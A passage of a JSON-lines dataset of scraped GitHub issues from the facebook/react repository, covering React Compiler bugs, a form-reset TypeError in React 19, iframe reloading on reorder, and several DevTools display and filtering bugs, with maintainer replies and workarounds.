API:\r\nhttps://github.com/facebook/react/blob/93a0c2830534cfbc4e6be3ecc9c9fc34dee3cfaa/packages/react-reconciler/src/ReactMutableSource.new.js#L30-L62\r\n\r\n> Warning: Detected multiple renderers concurrently rendering the same context provider. This is currently unsupported.\r\n\r\nThis warning suggests that two renderers **of the same type** (presumably two primary renderers) are both using a context at the same time (concurrently). This *might happen to work okay* in some cases (e.g. if only the global/default context value is being used) but it **may also break** depending on how each renderer is using the context.\r\n\r\nHope this helps answer your question! tl;dr is that the warning is valid and important."}, {"author": "vimcaw", "body": "Thank you for such a detailed answer! now I understand.\r\n\r\nBoth of [react-pixi](https://github.com/inlet/react-pixi) and [react-babylonjs](https://github.com/brianzinn/react-babylonjs) have a custom renderer, plus the original `react-dom`, there are 3 renderers, seems I must give up one of them."}, {"author": "alirezamirian", "body": "@bvaughn \n\n> This is partially a practical constraint (in that it covers 99% of use cases) and partially an intentional trade off in that certain APIs (like Context or useMutableSource) are able to be more efficiently implemented because of it.\n\nDoesn't this mean many cases of rendering multiple react roots in the same page (which seems to be [officially supported](https://react.dev/reference/react/useId#specifying-a-shared-prefix-for-all-generated-ids)) can lead to unexpected issues? \nWhat if there is a layer of abstraction for things like reading the current value of the context, which defaults to a simple  `._currentValue` property access but is can be changed to a different map-based implementation with a global option or something? It seems to not come with a big complexity overhead, as the change will be pretty isolated."}]}
{"repo": "facebook/react", "issue_number": 33577, "issue_url": "https://github.com/facebook/react/issues/33577", "issue_title": "[Compiler Bug]: Compiler tries to assign to variables that does not exist", "issue_author": "SimenB", "issue_body": "### What kind of issue is this?\n\n- [x] React Compiler core (the JS output is incorrect, or your app works incorrectly after optimization)\n- [ ] babel-plugin-react-compiler (build issue installing or using the Babel plugin)\n- [ ] eslint-plugin-react-compiler (build issue installing or using the eslint plugin)\n- [ ] react-compiler-healthcheck (build issue installing or using the healthcheck script)\n\n### Link to repro\n\nhttps://playground.react.dev/#N4Igzg9grgTgxgUxALhASwLYAcIwC4AEwBUYCASgmGgF4IDyARmTAG4IwEC+BAZjBAwEAOiAACMBAEM4eALRSYaKQHooeNABswogNzCAdphz4iBAAoQc7GAGEIBvAgAeeADQky9xy7zmBWGDcfAJCopIy8orKcnCCOAYIjjog+gaGLiaEcQZghJbWHAQAvAQAFIYEZnAAFloAJpIGHlJGGFIaDgAisB1oDh4A7mj1eDUlIiB4SgDmMxyUvKIeAHRrWAFBXG6VBJK8OwYAlCUAfES7ANobVmAe+wC6E6QI3k6u-rdlN4H3CAcWKwQGxvXxHNJVHJ5MzTNBzBb-YKlH5gNK7F6Uah0JgsGxlYj7ZAEWHwmCLDwOTG0BDccGGXaSPCwAwEAxQTSaNJcNIgLhAA\n\n### Repro steps\n\n`t2` is not defined, so there's a runtime JS error (`ReferenceError: assignment to undeclared variable t2`).\n\nScreenshot of buggy output for reference when bug is fixed in compiler:\n\n<img width=\"559\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/095c4ae4-d08a-4c96-8732-31c9ea77174e\" />\n\n---\n\nNote that removing `width = \"triggerRef\"` _or_ `const { triggerRef } = props;` makes the bug disappear.\n\n### How often does this bug happen?\n\nEvery time\n\n### What version of React are you using?\n\nN/A\n\n### What version of React Compiler are you using?\n\nRC ", "issue_labels": ["Type: Bug", "Component: React Compiler"], "comments": [{"author": "josephsavona", "body": "Thanks for reporting, this is a legit bug. At a glance, we're not correctly handling reassignment of function parameters. That's pretty sketchy in JS but it should obviously still work.\n\nAs a workaround, I would avoid reassigning `props`:\n\n```js\nexport const Popover = (\n  { children, animationDuration, width = \"triggerRef\", ...props },\n  ref,\n) => {\n  // _contextRef is unused?\n  const [contextProps, _contextRef] = useContextProps(props, ref, PopoverContext);\n  const { triggerRef } = contextProps;\n\n  useResizeObserver({ ref: triggerRef, onResize });\n\n  return null;\n};\n```"}, {"author": "SimenB", "body": "Yep, that's similar to the workaround we went for, thanks!\n\nFWIW, the pattern is something we \"inherited\" since we based the components the React Spectrum ones: https://github.com/adobe/react-spectrum/blob/027f96ad3c0358ec1d913e1b91849321f5f91d9a/packages/react-aria-components/src/Link.tsx#L60"}]}
{"repo": "facebook/react", "issue_number": 33614, "issue_url": "https://github.com/facebook/react/issues/33614", "issue_title": "[Compiler Bug]: new mutation aliasing model incorrectly detects a frozen value mutation when mutating a set created via passing the set constructor a frozen value", "issue_author": "deivshon", "issue_body": "### What kind of issue is this?\n\n- [x] React Compiler core (the JS output is incorrect, or your app works incorrectly after optimization)\n- [ ] babel-plugin-react-compiler (build issue installing or using the Babel plugin)\n- [ ] eslint-plugin-react-compiler (build issue installing or using the eslint plugin)\n- [ ] react-compiler-healthcheck (build issue installing or using the healthcheck script)\n\n### Link to repro\n\nhttps://playground.react.dev/#N4Igzg9grgTgxgUxALhAgdgQwEYBsEByCA7gLJQAumFAlhOgIK42Zg3oDmpEAJgrsgowoCADrpxNALYAHCDAoACYIqhgEAZSoUEigL6KAZjAhTFokDASY4FC5NnylK8rlob+CW-qMmzFgDoAgHooGmCpKDcadXxbCKjaWK87EHFxBAAPOQVFOHowJQYZGUUAXkUACgBKcoA+ZXFFPIKlAG1k2wQeABpFdQoPOJ0eAF1y1XUtagRK9BJFDyUAHn6hdg5FBprqppb0QsV6IZTugGEAC0xOXQrKgDdMXBFkNZgN2rKG4D3m-IOlPNiCcujwJkDFggKJVOiNduhms0aIYqkCQSMAlcwA8niJqrUfgjEc00Z5QQE+PgdDjngh4cSDPx1I0icTScNugFMDweDS8b99AKBujunMSCKePTBRIiVYKLAEctXO4yUpYd0ysB1TwDMdVecrjdNXqOTxLtcOAgDME6uI9OIQHogA\n\n### Repro steps\n\n1) In an event handler, create a Set by passing the Set constructor a frozen value like a piece of state or a prop (i.e. `const derivedSet = new Set(frozen)`)\n2) Mutate it by deleting/adding an element\n\n### How often does this bug happen?\n\nEvery time\n\n### What version of React are you using?\n\n19.1\n\n### What version of React Compiler are you using?\n\n6c7b1a1d9898025bb087a3b97d875091e4f67cf3", "issue_labels": ["Type: Bug", "Component: React Compiler"], "comments": [{"author": "josephsavona", "body": "Yup that\u2019s a bug. Thanks for posting, I\u2019ll look into it. "}, {"author": "josephsavona", "body": "Fixed in #33584 "}, {"author": "josephsavona", "body": "Thanks again for posting, this is fixed on main"}, {"author": "deivshon", "body": "@josephsavona Thank you for fixing this so quickly!"}, {"author": "josephsavona", "body": "Sure thing! It helped that I\u2019d already been working on the larger fix for a while ;-)"}]}
{"repo": "facebook/react", "issue_number": 33187, "issue_url": "https://github.com/facebook/react/issues/33187", "issue_title": "Bug: CSS not being applied properly in Chrome with React experimental (moveBefore)", "issue_author": "guillaumebrunerie", "issue_body": "React version: `0.0.0-experimental-3820740a-20250509`\n\nI ran into what appears to be a paint bug in Chrome, which is only triggered by React experimental (not React stable), and doesn\u2019t reproduce in either Firefox or Safari. Basically, after rerendering a list of elements with keys, the CSS is not being applied properly to the elements despite being correct in the dev tools.\n\nI reported it at https://issues.chromium.org/issues/417426569, but I\u2019m crossposting here as well in case someone can figure out how to reproduce it without React, or explain what is different between the latest stable version of React and React experimental.\n\n## Steps to reproduce the problem\n- Clone the repository at https://github.com/guillaumebrunerie/paint-bug\n- Run `npm install` and `npm run dev`, open Chrome at `localhost:5173`, and open the dev tools.\n- Note that the red rectangles are ordered from left to right when reading from top to bottom, this is correct.\n- Click the \"Refresh\" button in the webpage a few times (it simply recreates a fresh set of data to render, in the same way as the initial set of data is created).\n- Note that the red rectangle are no longer ordered from left to right, but checking the DOM in the dev tools, you can see that according to the `left: XX%` styles, they should be ordered.\n- You can also try to change very slightly the value of a `left: XX%` style (for instance going from `13%` to `13.00001%`), it completely changes the position of the corresponding element, which shows that the element wasn\u2019t painted at the correct position to begin with.\n\nSource code (React): https://github.com/guillaumebrunerie/paint-bug/blob/main/src/main.jsx\nCSS: https://github.com/guillaumebrunerie/paint-bug/blob/main/src/index.css\n\n## Problem Description\n\nThe example creates a list of 10 random numbers between 0 and 90, sorts it, and then for each of them renders an element with width 10% and left XX%. The list is rendered using React keys based on the original order, which means that clicking refresh will reuse the existing elements, reorder them, and change their CSS.\n\nI could only reproduce this issue with React experimental, but it seems clear to me that it is a Chrome issue, not a React issue, as the CSS is not being applied properly despite being correct in the DevTools. No idea what React experimental does differently than React stable, though.\n\nThe issue does not reproduce in either Firefox or Safari. Not sure if it is a regression, as I only recently switched to React experimental. I could reproduce it in Chrome Beta 137.0.7151.15 and in Chrome Canary 138.0.7177.0 as well.\n\n![Image](https://github.com/user-attachments/assets/84a9644b-87d9-43fb-81f8-3b399bc47fce)\n\nVideo: https://github.com/user-attachments/assets/451c82c0-1939-4a66-9d3b-c5a499b90442\n", "issue_labels": ["Type: Bug"], "comments": [{"author": "guillaumebrunerie", "body": "I managed to reproduce it without React, it\u2019s `parentNode.moveBefore(node, null)` that doesn\u2019t seem to apply CSS changes properly, check the Chrome issue for more details."}, {"author": "zp1996", "body": "[The issue of Chromium](https://issues.chromium.org/issues/417426569) has been fixed and the patch has been merged into Chromium\u2019s main branch. The fix is expected to ship in Chrome M139."}, {"author": "guillaumebrunerie", "body": "> [The issue of Chromium](https://issues.chromium.org/issues/417426569) has been fixed and the patch has been merged into Chromium\u2019s main branch. The fix is expected to ship in Chrome M139.\n\nThank you for the fix! "}]}
{"repo": "facebook/react", "issue_number": 30041, "issue_url": "https://github.com/facebook/react/issues/30041", "issue_title": "[React 19] requestFormReset reports TypeError Cannot read properties of null (reading 'queue') on repeated form submissions", "issue_author": "evisong", "issue_body": "## Summary\r\n\r\nHi, React team,\r\n\r\nI've recently been trying the new form actions in React 19, I'm trying to reproduce a race condition with multiple form submissions in a short time. However, I occasionally get the error `TypeError\r\nCannot read properties of null (reading 'queue')` after a few consecutive submissions.\r\n\r\nAfter some investigations, I'm able to create the minimal reproducing steps below:\r\n\r\n1. Open [codesandbox.io/p/sandbox/confident-sky-8vr69k](https://codesandbox.io/p/sandbox/confident-sky-8vr69k)\r\n```jsx\r\nfunction App() {\r\n  const formAction = async () => {\r\n    await new Promise((resolve) => setTimeout(resolve, 3000));\r\n  };\r\n\r\n  return (\r\n    <form action={formAction}>\r\n      <input type=\"text\" name=\"name\" />\r\n      <input type=\"submit\" />\r\n    </form>\r\n  );\r\n}\r\n\r\nexport default App;\r\n```\r\n2. Input \"1\" in the text field\r\n3. Submit form\r\n4. Within 3 seconds (before the Client Action resolved), submit the form again\r\n\r\nExpected behavior:\r\nForm fields resetted.\r\n\r\nActual behavior:\r\nThe page breaks reporting a TypeError below:\r\n```\r\nTypeError: Cannot read properties of null (reading 'queue')\r\nrequestFormReset$1\r\nhttps://gwprwq.csb.app/node_modules/react-dom/cjs/react-dom-client.development.js:7001:74\r\neval\r\nhttps://gwprwq.csb.app/node_modules/react-dom/cjs/react-dom-client.development.js:6956:15\r\nstartTransition\r\nhttps://gwprwq.csb.app/node_modules/react-dom/cjs/react-dom-client.development.js:6908:27\r\nstartHostTransition\r\nhttps://gwprwq.csb.app/node_modules/react-dom/cjs/react-dom-client.development.js:6948:7\r\nlistener\r\nhttps://gwprwq.csb.app/node_modules/react-dom/cjs/react-dom-client.development.js:16008:21\r\nprocessDispatchQueue\r\nhttps://gwprwq.csb.app/node_modules/react-dom/cjs/react-dom-client.development.js:16066:17\r\neval\r\nhttps://gwprwq.csb.app/node_modules/react-dom/cjs/react-dom-client.development.js:16665:9\r\nbatchedUpdates$1\r\nhttps://gwprwq.csb.app/node_modules/react-dom/cjs/react-dom-client.development.js:2689:40\r\ndispatchEventForPluginEventSystem\r\nhttps://gwprwq.csb.app/node_modules/react-dom/cjs/react-dom-client.development.js:16221:7\r\ndispatchEvent\r\nhttps://gwprwq.csb.app/node_modules/react-dom/cjs/react-dom-client.development.js:20127:11\r\ndispatchDiscreteEvent\r\nhttps://gwprwq.csb.app/node_modules/react-dom/cjs/react-dom-client.development.js:20095:11\r\n```\r\n\r\nAm I missing anything? Thanks.", "issue_labels": ["Type: Bug", "React 19"], "comments": [{"author": "eps1lon", "body": "Thank you for the repro. The Codesandbox didn't load for me so I created a new one. We can repro this with just clicking submit buttons as well:\r\n\r\nhttps://github.com/facebook/react/assets/12292047/6f4444ec-1393-4de5-aab8-ab8b5c93ba54\r\n\r\n-- https://codesandbox.io/p/sandbox/confident-sky-8vr69k\r\n\r\n1. Enter a value\r\n2. Submit form\r\n3. Submit again before form action resolved\r\n4. Observe crash\r\n"}, {"author": "evisong", "body": "Thanks for fixing the Codesandbox. Btw the React I used was `19.0.0-rc-3563387fe3-20240621`."}, {"author": "Parvezkhan0", "body": "Is this issue resolved?"}, {"author": "evisong", "body": "Hi, React team, \r\n\r\nMay I ask is there any update on this? Thanks."}, {"author": "ryanflorence", "body": "I'm running into this everywhere, including the official doc's demo of `useFormStatus` (when you remove the `disabled` button prop) and quickly click the button it reliably breaks\n\n```tsx\nimport { useFormStatus } from \"react-dom\";\nimport { submitForm } from \"./actions.js\";\n\nfunction Submit() {\n  const { pending } = useFormStatus();\n  return <button type=\"submit\">{pending ? \"Submitting...\" : \"Submit\"}</button>;\n}\n\nfunction Form({ action }) {\n  return (\n    <form action={action}>\n      <Submit />\n    </form>\n  );\n}\n\nexport default function App() {\n  return <Form action={submitForm} />;\n}\n```\n\n<img width=\"1618\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/bb31bbfa-e843-4b75-a66c-5f8f3c279b2c\" />\n\nhttps://codesandbox.io/p/sandbox/react-dev-forked-n57tkm"}, {"author": "rickhanlonii", "body": "Thanks for reporting, this should be fixed with: https://github.com/facebook/react/pull/33055\n\nSandbox of @evisong's issue with the PR: https://codesandbox.io/p/sandbox/confident-sky-8vr69k\n\nSandbox of @ryanflorence's issue with that PR: https://codesandbox.io/p/sandbox/react-dev-forked-n57tkm"}, {"author": "chrisb2244", "body": "I still see the same error (including in the sandbox linked above) if I click a bunch of times. Is there a maximum number of queued events or some timing requirement between them in the current fix (I'm using react@canary -> ^19.2.0-canary-280ff6fe-20250606 in my test project).\n\nCan I avoid this by switching to exclusively controlled inputs, or will that have no effect here?\nIs there some other workaround to prevent this error?"}]}
{"repo": "facebook/react", "issue_number": 858, "issue_url": "https://github.com/facebook/react/issues/858", "issue_title": "Iframe's reinitialise when moving down within a group of components", "issue_author": "pieterv", "issue_body": "When moving a component with an iframe down within a group of components it reinitialises the iframe. The iframe only reinitialises when moving down, moving upward seems to work fine.\n\nExample: http://jsfiddle.net/pieterv/fnkLf/\n", "issue_labels": ["Type: Bug", "Component: DOM", "Resolution: Unsolved"], "comments": [{"author": "vjeux", "body": "I can't see anything wrong with your code from a 2 min inspection. You are properly using key and the reconciliation should work fine. cc @jordwalke\n"}, {"author": "sophiebits", "body": "Curious. I'll take a look later.\n"}, {"author": "plievone", "body": "Up/Down asymmetry may be related to this (ok by itself): https://github.com/facebook/react/blob/338ce60/src/core/ReactMultiChild.js#L336-L343\nAnd iframe reset may be related to this https://github.com/facebook/react/blob/338ce60/src/dom/DOMChildrenOperations.js#L100-L105 or https://github.com/facebook/react/blob/338ce60/src/dom/DOMChildrenOperations.js#L48-L52. \n(Have you tried with own iframe content?)\n"}, {"author": "benjamn", "body": "`<iframe>`s reload whenever they are reattached to the DOM. So it might not be reasonable to expect this to work. Consider two frames that need to trade places. One has to get removed from the DOM and reattached, no matter what you do. Hoping to get away with lucky re-renderings is a recipe for fragile code.\n"}, {"author": "pieterv", "body": "@benjamn yes that makes sense thinking about the DOM operations required to reorder the elements, it was just because of reacts preference to move things downward as @plievone pointed out that the up operation was working without reinitialising.\n"}, {"author": "sophiebits", "body": "You might think that you could just call `insertBefore` or `appendChild` without ever removing the elements from the DOM but at least in Chrome, that still makes one of the iframes reload. Maybe that means we can't fix this.\n"}, {"author": "syranide", "body": "Yeah, just did some manual tests as well, this actually appears to be _impossible_ to workaround in the DOM, and some internet searching suggests the same.\n\nThe only universal solution I see is to somehow be able to mark a component as `mustNotMove` which will apply all the way up to the root, which would prevent any move operation on those nodes and the siblings would be used for reordering instead. It would work for all cases except for when two `mustNotMove` components changes sides.\n\nHowever, I'm curious how much of an issue this actually is today? Does this make iframe in React virtually pointless because of conditionals further up in parents, or is it really only an issue when explicitly moving components with iframes around?\n"}, {"author": "benjamn", "body": "This is one of the most regrettable misfeatures of `<iframe>`s, in my opinion. And, yes, it makes them pretty much useless in situations where DOM manipulations are abstracted out of your control, as they are in React.\n"}, {"author": "plievone", "body": "To prevent reloading of `<iframe>`s, one can keep each of them in separate divs, somewhere safe from DOM manipulations, and move/scale them with absolute positioning in sync with some placeholder elements. :)\n"}, {"author": "syranide", "body": "@plievone Yeah, but the only way to keep them perfectly in sync would be to poll every frame, and this would cause lag on IE8 as it doesn't support `requestAnimationFrame`. Also, you'll have issues with `z-index`.\n"}, {"author": "syranide", "body": "@spicyj @benjamn I had a look at React and it is possible to solve this _as good as it gets_ (i.e. an iframe may never move to the other side of another iframe) by applying a `immovable`-flag up the hierarchy for iframes. When React wants to move such a component it should instead shuffle the siblings over to the other side of it instead of moving the node itself. This should have virtually zero cost when no `immovable` component is moved.\n\nBeen trying to wrap my head around `ReactMultiChild` and `DOMChildrenOperations` for a bit, it seems like it should be possible. But my head is apparently not up for the task right now. :)\n"}, {"author": "pieterv", "body": "Just for reference i got an implementation going as @plievone suggested by absolute positioning the iframe into place, http://jsfiddle.net/pieterv/fnkLf/6/, but as expected it seems to be pretty fragile code, you would really need to have the siblings as set height elements to get away with not polling their position on every frame.\n"}, {"author": "syranide", "body": "@pieter-vanderwerff FYI, I have a proof-of-concept for a React PR working right now, just fixing the last issues. With it, iframes will work as they should as long as two iframe containing components never switch sides. Meaning, it should basically solve most common use-cases, except for moving say comments with iframes up/down in a list, but static iframes and blog style pages will work perfectly.\n\nIt seems like it's a relatively light-weight fix too so hopefully they accept it.\n"}, {"author": "pieterv", "body": "@syranide awesome, i look forward to seeing it!\n"}, {"author": "syranide", "body": "@pieter-vanderwerff I dare you to check my updated PR, I found something _way way better_ than attributes to use! :D\n"}, {"author": "pixelcort", "body": "Would using CSS Flexbox's `box-ordinal-group` to rearrange iframes help? That way you don't need to remove either iframe from the DOM. Of course, this would only work on newer browsers, and would be something one would write themselves on top of React.\n"}, {"author": "syranide", "body": "@pixelcort Probably not, the issue is specifically when they (or any of their ancestores) are detached from the DOM, which always happens if you try to move them in any way it seems.\n"}, {"author": "Prinzhorn", "body": "I have a related issue with iframes which needs a different fix. I have a component using the Twitter API to embed a tweet in `componentDidMount`. This works great, until the component is rearranged by react (it's part of a list and has a key). When this happens, the iframe becomes completely empty. It can't just reload the src because the Twitter API does JavaScript magic directly with the iframe. I would need to clean up the iframe and load a new one using the API when this happens.\n\nSo the problem here is that the component has no way of knowing that this just happened. There is no lifecycle method telling it about the DOM manipulation (sth. like `componentDidRemount`?). Since the component also uses the PureRenderMixin literally nothing happens to it when it gets moved in the DOM. It doesn't seem possible for me to fix this outside of react.\n\nEdit: I found a workaround for my particular use-case to at least have a chance to reload the tweet. The iframe will fire an `onload` event after it has been reloaded (even though the twitter generated iframe doesn't have a `src`).\n"}, {"author": "aduth", "body": ">Would using CSS Flexbox's box-ordinal-group to rearrange iframes help? That way you don't need to remove either iframe from the DOM. Of course, this would only work on newer browsers, and would be something one would write themselves on top of React.\r\n\r\nI was able to find some success in using [Flexbox's `order` property](https://developer.mozilla.org/en-US/docs/Web/CSS/order):\r\n\r\n- Before: https://codepen.io/aduth/pen/QvpxwL\r\n- After: https://codepen.io/aduth/pen/eWvKeW\r\n\r\nMore a hack than a general solution really, but seems to be working well enough for my purposes.\r\n\r\nThe trick being that in the \"After\" example, the order of elements in the DOM never truly changes, just visually reordered with the `order` styling."}, {"author": "afercia", "body": "5.4.1. Reordering and Accessibility\r\nhttps://www.w3.org/TR/css-flexbox-1/#order-accessibility"}, {"author": "gaearon", "body": "This problem is both rare and hard enough that it is unlikely we\u2019ll be spending our time on this.\r\n\r\nThe complexity and increase in the code size this will introduce is probably not worth the effort.\r\nSo I\u2019ll close this issue as unsolved.\r\n\r\nI\u2019m open to reviving it if somebody comes up with a simple solution to this, but I just don\u2019t see it."}, {"author": "flackeryy", "body": "18.07.2022 this issue still here "}, {"author": "Vizards", "body": "Apologies for resurrecting this old issue, but change is coming.\n\nThanks to the experimental support for [moveBefore](https://developer.chrome.com/blog/movebefore-api?hl=zh-cn) (Chrome 133+) added in React 19 (https://github.com/facebook/react/pull/31596), moving an `iframe` within a list no longer triggers a reload of the iframe! I've created a demo using native HTML Drag and Drop\uff1a\n\nhttps://github.com/user-attachments/assets/19d68cb3-83c8-4664-876c-e624c76f2bf7\n\nIn the web page, there are 4 iframes, each embedding a `video`. One of the iframes has a DOM structure like this:\n\n<img width=\"727\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/70929e04-fdc2-4ea3-bb0d-05a574457638\" />\n\nDuring my movement, the iframe did not reload, and the video did not replay. Everything worked as we expected."}]}
{"repo": "facebook/react", "issue_number": 33198, "issue_url": "https://github.com/facebook/react/issues/33198", "issue_title": "[Compiler Bug]: compiler doesn't work with `@svgr/webpack`", "issue_author": "ellemedit", "issue_body": "### What kind of issue is this?\n\n- [ ] React Compiler core (the JS output is incorrect, or your app works incorrectly after optimization)\n- [x] babel-plugin-react-compiler (build issue installing or using the Babel plugin)\n- [ ] eslint-plugin-react-compiler (build issue installing or using the eslint plugin)\n- [ ] react-compiler-healthcheck (build issue installing or using the healthcheck script)\n\n### Link to repro\n\nhttps://github.com/ellemedit/nextjs-react-compiler-not-work\n\n### Repro steps\n\n1. `bun dev`\n2. open with React devtools\n3. you can see component not memoized even react compiler configured:\n   <img width=\"1326\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/2440ccb4-1f38-4fdf-8abf-7b3520e54310\" />\n4. then you can edit `app/IconButton.tsx` to:\n   ```tax\n   \"use client\";\n\n   import { ComponentProps } from \"react\";\n\n   export function IconButton({ children, ...props }: ComponentProps<\"button\">) {\n     return <button {...props}>{children}</button>;\n   }\n   ```\n5. `Cmd + K` and rerun `bun dev`\n6. you can see component is memoized:\n   <img width=\"1326\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/a99fd194-c561-44c6-9be5-3889aae8dec6\" />\n\nboth Turbopack and webpack behave same.\n\n### How often does this bug happen?\n\nEvery time\n\n### What version of React are you using?\n\n19.2.0\n\n### What version of React Compiler are you using?\n\nrc.1", "issue_labels": ["Type: Bug", "Status: Unconfirmed", "Component: React Compiler"], "comments": [{"author": "ellemedit", "body": "this is bug of Next.js. Not React. so close"}]}
{"repo": "facebook/react", "issue_number": 33292, "issue_url": "https://github.com/facebook/react/issues/33292", "issue_title": "[DevTools Bug]: UI not using full window space", "issue_author": "bidinzky", "issue_body": "### Website or app\n\ntbd\n\n### Repro steps\n\nSadly i dont know what could be the cause so i cant offer any way to reproduce it.\nFor me it is atleast not tied to a specific react application.\n\n![Image](https://github.com/user-attachments/assets/054e62b7-83fd-4249-865a-a0cae3688b32)\n\n### How often does this bug happen?\n\nEvery time\n\n### DevTools package (automated)\n\n_No response_\n\n### DevTools version (automated)\n\n_No response_\n\n### Error message (automated)\n\n_No response_\n\n### Error call stack (automated)\n\n```text\n\n```\n\n### Error component stack (automated)\n\n```text\n\n```\n\n### GitHub query string (automated)\n\n```text\n\n```", "issue_labels": ["Type: Bug", "Status: Unconfirmed", "Component: Developer Tools"], "comments": [{"author": "dsabanin", "body": "I'm seeing the same thing, in Chrome version 138.0.7166.2 (Official Build) dev (arm64). Tried everything I can think of to reset the size.\n"}, {"author": "therahulbehera", "body": "> I'm seeing the same thing, in Chrome version 138.0.7166.2 (Official Build) dev (arm64). Tried everything I can think of to reset the size.\n\n[Chrome Beta for Desktop Update](https://chromereleases.googleblog.com/2025/05/chrome-beta-for-desktop-update_15.html)\nThursday, May 15, 2025\n\nThe Beta channel has been updated to 137.0.7151.27 for Windows, Mac and Linux.\n\n"}, {"author": "therahulbehera", "body": "![Image](https://github.com/user-attachments/assets/8784a5e4-0926-4f07-9ecd-e8964aca4ace)\n\nI'm using Chrome Version 136.0.7103.114 (Official Build) (64-bit) - @latest-build\n\nand wasn't able to reproduce the issue. could you (@bidinzky) please give more info"}, {"author": "bidinzky", "body": "Hey sorry for not answering in time.\n\nIt seems it got fixed by a recent Chrome and or Devtools update.\nChrome Dev Version Version 138.0.7180.3 and React Developer Tools 6.1.2.\n\nSorry for the hassel.\nI would close it for now and if someone else has the same issue we could reopen it."}]}
{"repo": "facebook/react", "issue_number": 33171, "issue_url": "https://github.com/facebook/react/issues/33171", "issue_title": "[Compiler Bug]: React Compiler breaks SuperToken's react-native global fetch patch", "issue_author": "vanstinator", "issue_body": "### What kind of issue is this?\n\n- [x] React Compiler core (the JS output is incorrect, or your app works incorrectly after optimization)\n- [ ] babel-plugin-react-compiler (build issue installing or using the Babel plugin)\n- [ ] eslint-plugin-react-compiler (build issue installing or using the eslint plugin)\n- [ ] react-compiler-healthcheck (build issue installing or using the healthcheck script)\n\n### Link to repro\n\nhttps://github.com/vanstinator/supertokens-react-compiler-repro\n\n### Repro steps\n\n`react-native-supertokens` replaces `global.fetch` with it's own wrapper to facilitate automatic session token refreshing and a few other things. When the app is run with the React Compiler enabled `fetch` is broken and all calls to the function fail with `TypeError: Cannot read property 'doRequest' of undefined`.\n\nI haven't followed compiler development very closely at all, so I didn't have enough context about what the compiler is doing to change the js runtime behavior to pull the thread much further than this.\n\nThe patching code in `react-native-supertokens` can be found here: https://github.com/supertokens/supertokens-react-native/blob/master/lib/ts/fetch.ts#L63-L91\n\nThe issue isn't specific to Android, it just happened to be the emulator I had open while debugging.\n\n1. Run an Android emulator \n2. `npm install`\n3. `npm run android`\n4. The console should contain a dump of the response body from fetching `http://localhost:8081`\n5. Open `app.json` and set `react-compiler` in the `experiments` block to `false`\n6. Kill your metro process and restart it with `npx expo start --clear`, and refresh the app in the android emulator\n7. The `fetch` call is broken and the console contains logs of `TypeError: Cannot read property 'doRequest' of undefined`\n\n### How often does this bug happen?\n\nEvery time\n\n### What version of React are you using?\n\n19.0.0\n\n### What version of React Compiler are you using?\n\n19.0.0-beta-af1b7da-20250417", "issue_labels": ["Type: Bug", "Status: Unconfirmed", "Component: React Compiler"], "comments": [{"author": "josephsavona", "body": "Thanks for posting. Note that React Compiler shouldn't be transforming the supertokens code itself since that's in node_modules (and we don't support classes anyway). And in general the compiler should work just fine with a patched global like this. My guess is that the code that is calling `fetch()` has some issue when run using the compiler. There's a lot of code in the repro, are you able to get a distilled example in the playground? I would focus on the code that is calling fetch()."}, {"author": "vanstinator", "body": "I pushed a simplified repro, but I've also spent some time narrowing down the specific place the error is thrown. It seems to be that when `AuthHttpRequest` is imported here https://github.com/supertokens/supertokens-react-native/blob/master/lib/ts/recipeImplementation.ts#L3 it's value is `undefined` when the compiler is active. So the interceptor function a few lines down throws on `AuthHttpRequest.doRequest`, which is invoked when my example code calls `fetch`.\n\nLooking further, it seems like there's a circular dependency between https://github.com/supertokens/supertokens-react-native/blob/master/lib/ts/fetch.ts#L30 and https://github.com/supertokens/supertokens-react-native/blob/master/lib/ts/recipeImplementation.ts#L3\n\nI was able to confirm with a simple circular dependency in my reproduction repository that failed in the same manner when the react compiler was active.\n\nOn that note, I _think_ https://github.com/facebook/react/issues/32440 and https://github.com/expo/expo/issues/35100 are related to what I'm seeing. Happy to close this if it's a dupe.\n\n"}, {"author": "josephsavona", "body": "Ah yes, thanks for debugging more! A circular dependency would definitely explain it, let\u2019s close as a duplicate of #32440. "}]}
{"repo": "facebook/react", "issue_number": 32659, "issue_url": "https://github.com/facebook/react/issues/32659", "issue_title": "[DevTools Bug]: cannot double click anymore on component name to filter the tree view (in Components tab) (since v6.1.1)", "issue_author": "clementcitiz", "issue_body": "### Website or app\n\nNone\n\n### Repro steps\n\n```\nconst A = () => {\n  return <div>A</div>;\n};\n\nconst B = () => {\n  return (\n    <>\n      <div>B</div>\n      <C/>\n      <D/>\n    </>\n  );\n};\n\nconst C = () => {\n  return <div>C</div>;\n};\n\nconst D = () => {\n  return <div>D</div>;\n};\n\nfunction App() {\n  return (\n    <>\n      <A />\n      <B />\n    </>\n  );\n}\n\nexport default App;\n```\n\n1. Open dev tools, Component tab\n2. Double click on B: nothing happens\n\n![Image](https://github.com/user-attachments/assets/26d9ba29-a3b5-4c9c-ad48-cee449487724)\n\nWith version 6.0.1, double clicking on B filters the tree by showing only B and its direct children\n\n![Image](https://github.com/user-attachments/assets/df5f5888-ccbe-45ef-8eca-a27897ba145d)\n \nTested on Chrome and Firefox with version 6.1.1\n\n### How often does this bug happen?\n\nEvery time\n\n### DevTools package (automated)\n\n_No response_\n\n### DevTools version (automated)\n\n_No response_\n\n### Error message (automated)\n\n_No response_\n\n### Error call stack (automated)\n\n```text\n\n```\n\n### Error component stack (automated)\n\n```text\n\n```\n\n### GitHub query string (automated)\n\n```text\n\n```", "issue_labels": ["Type: Bug", "Status: Unconfirmed", "Component: Developer Tools"], "comments": [{"author": "narekmalk", "body": "Can I take this issue?"}, {"author": "sergiotales1", "body": "Hello!\nI tested out here as well and it seems that right now its not possible to filter the tree view, but you can highlight it using the eye on the right side of the console. When you click it will make the tree of the selected component to be slightly highlighted.\n\nDoes this help or you need something more specific? "}, {"author": "hmon", "body": "+1 \nAny news on this?"}, {"author": "clementcitiz", "body": "> Hello! I tested out here as well and it seems that right now its not possible to filter the tree view, but you can highlight it using the eye on the right side of the console. When you click it will make the tree of the selected component to be slightly highlighted.\n> \n> Does this help or you need something more specific?\n\nHi @sergiotales1 , the eye button does something different and is definitely not the filtering I am used to with double clicking.\nLet me clarify:\n\n\n> ![Image](https://github.com/user-attachments/assets/26d9ba29-a3b5-4c9c-ad48-cee449487724)\n> \n> 